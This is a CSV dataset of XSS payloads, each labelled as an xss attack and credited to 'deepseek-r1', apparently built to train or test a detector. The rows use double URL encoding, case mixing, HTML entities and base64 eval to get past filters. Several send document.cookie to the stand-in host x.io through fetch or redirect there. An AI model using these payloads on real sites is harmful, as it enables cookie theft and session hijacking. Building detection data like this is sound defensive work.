text,label,attack_type,generator
%253Ciframe%2520onerror%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
"<AuDiO OnLoAd=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
'><ViDeO OnErRoR=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,deepseek-r1
%2527%253E%253Cscript%2520onload%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%253Ca%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%253Cimg%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2522%253E%253Cimg%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%253Cobject%2520onload%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
%253Csvg%2520onerror%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Cdetails%2520onfocus%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%253Cdetails%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
"""><MaRqUeE OnLoAd=aLeRt(dOcUmEnT.CoOkIe)>",1,xss,deepseek-r1
<ScR<ScRiPt>iPt>aLeRt(dOcUmEnT.CoOkIe)</sCrIpT>,1,xss,deepseek-r1
%253Cinput%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cinput%2520onload%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
"<DeTaIlS OnInPuT=""pRiNt()"">",1,xss,deepseek-r1
<ScRiPt oNtOgGlE=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
%2527%253E%253Ca%2520onload%253Dprint%2528%2529%253E,1,xss,deepseek-r1
"""><MaRqUeE OnErRoR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
"<IfRaMe oNfOcUs=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
%253Cinput%2520onerror%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
<ViDeO OnInPuT=AlErT(1)>,1,xss,deepseek-r1
%2522%253E%253Cmarquee%2520oninput%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253cObJeCt%2520oNcLiCk%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,deepseek-r1
'><IfRaMe oNlOaD=CoNfIrM(1)>,1,xss,deepseek-r1
%253Caudio%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253Cinput%2520onclick%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253Cdiv%2520onerror%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2527%253E%253Cvideo%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Ciframe%2520onfocus%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253Caudio%2520onerror%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cdiv%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
'><scr ipt onstart=print()>,1,xss,deepseek-r1
"<DiV OnInPuT=""aLeRt(1)"">",1,xss,deepseek-r1
%2527%253E%253Cdiv%2520onmouseover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cobject%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
&Lt;aUdIo oNpOiNtErOvEr=aLeRt(dOcUmEnT.CoOkIe)&Gt;,1,xss,deepseek-r1
%2527%253E%253Cobject%2520oninput%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2522%253E%253Cbody%2520onmouseover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
<ImG OnErRoR=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
%253Cscript%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cdetails%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
&lt;input onfocus=alert(1)&gt;,1,xss,deepseek-r1
"""><BoDy oNlOaD=PrInT()>",1,xss,deepseek-r1
'><ViDeO OnInPuT=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,deepseek-r1
'><InPuT OnAnImAtIoNsTaRt=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,deepseek-r1
%2527%253E%253Ca%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Cdetails%2520onstart%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%253Ciframe%2520onanimationstart%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
'&gt;&lt;DeTaIlS OnAnImAtIoNsTaRt=eVaL(AtOb('YwXlCnQoMsK'))&gt;,1,xss,deepseek-r1
%2527%253E%253Cinput%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2522%253E%253Caudio%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
<AuDiO OnClIcK=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
%253Ciframe%2520onclick%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
%253Cbody%2520onstart%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253Cinput%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cdiv%2520ontoggle%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
%253Cvideo%2520onpointerover%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
<ObJeCt oNlOaD=AlErT(1)>,1,xss,deepseek-r1
"<SvG OnToGgLe=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
%253Ciframe%2520onmouseover%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
'><AuDiO OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
%253Cscript%2520onstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
%253Caudio%2520onclick%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2522%253E%253Csvg%2520onerror%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%253Cimg%2520oninput%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
<ObJeCt oNfOcUs=lOcAtIoN='//x.iO'>,1,xss,deepseek-r1
%2527%253E%253Ca%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
&lt;a oninput=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,deepseek-r1
%253Cmarquee%2520onmouseover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253cDeTaIlS%2520OnAnImAtIoNsTaRt%253DcOnFiRm%25281%2529%253e,1,xss,deepseek-r1
"""&gt;&lt;ViDeO OnInPuT=AlErT(DoCuMeNt.cOoKiE)&gt;",1,xss,deepseek-r1
"<ScRiPt onanimationstart=""print()"">",1,xss,deepseek-r1
%2527%253E%253Cobject%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Cdetails%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
"""><DeTaIlS OnClIcK=PrInT()>",1,xss,deepseek-r1
%253Cscr%253Cscript%253Eipt%253Econfirm%25281%2529%253C%252Fscript%253E,1,xss,deepseek-r1
"<ImG OnLoAd=""AlErT(DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
'><AuDiO OnStArT=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
%2527%253E%253Ca%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onstart%253Dalert%25281%2529%253E,1,xss,deepseek-r1
'&gt;&lt;audio onstart=alert(1)&gt;,1,xss,deepseek-r1
%2522%253E%253cInPuT%2520OnStArT%253dAlErT%2528DoCuMeNt.dOmAiN%2529%253E,1,xss,deepseek-r1
%2527%2526gt%253B%2526lt%253Bdetails%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2526gt%253B,1,xss,deepseek-r1
%2522%253E%253Cdetails%2520onpointerover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%253CBoDy%2520oNsTaRt%253DpRiNt%2528%2529%253E,1,xss,deepseek-r1
%253Cdiv%2520onfocus%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Ciframe%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
"<DiV OnErRoR=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,deepseek-r1
%2522%253E%253Cimg%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%253Cdetails%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,deepseek-r1
<DeTaIlS OnStArT=AlErT(1)>,1,xss,deepseek-r1
%253Cobject%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%2527%253E%253Ca%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
"""&gt;&lt;a onanimationstart=alert(document.domain)&gt;",1,xss,deepseek-r1
&lt;input onmouseover=alert(document.domain)&gt;,1,xss,deepseek-r1
%253Ciframe%2520onclick%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
%2522%2526gt%253B%2526lt%253Binput%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2526gt%253B,1,xss,deepseek-r1
&lt;script ontoggle=print()&gt;,1,xss,deepseek-r1
%253Cscr%2500ipt%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253Cinput%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253CScRiPt%253EFETCH%2528%2527%252F%252FX.IO%252F%2527%252BDOCUMENT.COOKIE%2529%253C%252FScRiPt%253E,1,xss,deepseek-r1
%253Cinput%2520onpointerover%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253Cvideo%2520ontoggle%253Dalert%25281%2529%253E,1,xss,deepseek-r1
"""><DeTaIlS OnStArT=LoCaTiOn='//X.Io'>",1,xss,deepseek-r1
%253Cobject%2520onpointerover%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2527%253E%253Caudio%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
%253Cmarquee%2520onanimationstart%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Caudio%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253Csvg%2520onmouseover%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cbody%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cvideo%2520onclick%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
"""><DiV OnPoInTeRoVeR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
%253CDiV%2520OnErRoR%253DCoNfIrM%25281%2529%253E,1,xss,deepseek-r1
%253Cimg%2520onmouseover%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
%2527%253E%253Cobject%2520onpointerover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253Ciframe%2520onmouseover%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253Cdetails%2520onerror%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
<ViDeO OnMoUsEoVeR=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
'><DeTaIlS OnFoCuS=PrInT()>,1,xss,deepseek-r1
%253Ca%2520onerror%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
%253Cinput%2520onerror%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2527%253E%253Caudio%2520onerror%253Dalert%25281%2529%253E,1,xss,deepseek-r1
"""&gt;&lt;iframe ontoggle=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,deepseek-r1
%2527%253E%253Cvideo%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cdiv%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
%2527%253E%253Ciframe%2520onerror%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%2522%253E%253Csvg%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
"""&gt;&lt;audio oninput=confirm(1)&gt;",1,xss,deepseek-r1
<BoDy oNaNiMaTiOnStArT=AlErT(1)>,1,xss,deepseek-r1
%2522%253E%253Cdiv%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
"""><A OnErRoR=PrInT()>",1,xss,deepseek-r1
%253cScRiPt%2520oNcLiCk%253DaLeRt%2528dOcUmEnT.CoOkIe%2529%253e,1,xss,deepseek-r1
'&gt;&lt;ImG OnMoUsEoVeR=CoNfIrM(1)&gt;,1,xss,deepseek-r1
%2522%253E%253Caudio%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
"<MaRqUeE OnToGgLe=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
"""&gt;&lt;A OnToGgLe=aLeRt(dOcUmEnT.DoMaIn)&gt;",1,xss,deepseek-r1
"<A OnFoCuS=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,deepseek-r1
<ViDeO OnStArT=EvAl(aToB('yWxLcNqOmSk'))>,1,xss,deepseek-r1
%253Cmarquee%2520onstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
"<ScRiPt oNpOiNtErOvEr=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
<BoDy oNeRrOr=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,deepseek-r1
"&lt;ScRiPt oninput=""confirm(1)""&gt;",1,xss,deepseek-r1
%2527%253E%253Csvg%2520onfocus%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2522%253E%253Cimg%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
%253CA%2520OnAnImAtIoNsTaRt%253D%2522PrInT%2528%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Cmarquee%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
'&gt;&lt;svg onerror=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,deepseek-r1
'><BoDy oNsTaRt=aLeRt(dOcUmEnT.CoOkIe)>,1,xss,deepseek-r1
"""&gt;&lt;marquee onload=confirm(1)&gt;",1,xss,deepseek-r1
%2527%253E%253CViDeO%2520OnLoAd%253DlOcAtIoN%253D%2527%252F%252Fx.iO%2527%253E,1,xss,deepseek-r1
%2522%253E%253Caudio%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cinput%2520onload%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Cbody%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
"""><AuDiO OnErRoR=AlErT(DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
<AuDiO OnInPuT=CoNfIrM(1)>,1,xss,deepseek-r1
%2522%253E%253Cimg%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
"""&gt;&lt;DiV OnInPuT=EvAl(aToB('yWxLcNqOmSk'))&gt;",1,xss,deepseek-r1
%2522%253E%253Cdiv%2520onmouseover%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%253Cvideo%2520oninput%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%253Cscript%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
<DiV OnLoAd=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,deepseek-r1
&lt;DeTaIlS OnErRoR=LoCaTiOn='//X.Io'&gt;,1,xss,deepseek-r1
%2527%253E%253Cscript%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
"<ObJeCt oNcLiCk=""AlErT(1)"">",1,xss,deepseek-r1
%253Cinput%2520onclick%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
%253Cbody%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
%2522%253E%253Caudio%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cvideo%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
%253Cobject%2520onanimationstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Cscript%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2527%253E%253Csvg%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cscript%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%2522%253E%253Csvg%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253Cimg%2520onpointerover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Caudio%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%2527%253E%253Ca%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
'><DeTaIlS OnPoInTeRoVeR=CoNfIrM(1)>,1,xss,deepseek-r1
%253Cobject%2520onerror%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253Cdetails%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cimg%2520onfocus%253D%2522confirm%25281%2529%2522%253E,1,xss,deepseek-r1
%253cImG%2520OnClIcK%253dCoNfIrM%25281%2529%253E,1,xss,deepseek-r1
%253Ciframe%2520onstart%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%253cBoDy%2520oNpOiNtErOvEr%253D%2522PrInT%2528%2529%2522%253E,1,xss,deepseek-r1
%2527%2526gt%253B%2526lt%253Bobject%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,deepseek-r1
%253Cdetails%2520oninput%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
%253cBoDy%2520oNlOaD%253d%2522aLeRt%2528dOcUmEnT.CoOkIe%2529%2522%253E,1,xss,deepseek-r1
%253Ciframe%2520onanimationstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
'><ScRiPt oNlOaD=CoNfIrM(1)>,1,xss,deepseek-r1
%253Ca%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cvideo%2520onload%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%253CSvG%2520OnMoUsEoVeR%253DLoCaTiOn%253D%2527%252F%252FX.Io%2527%253E,1,xss,deepseek-r1
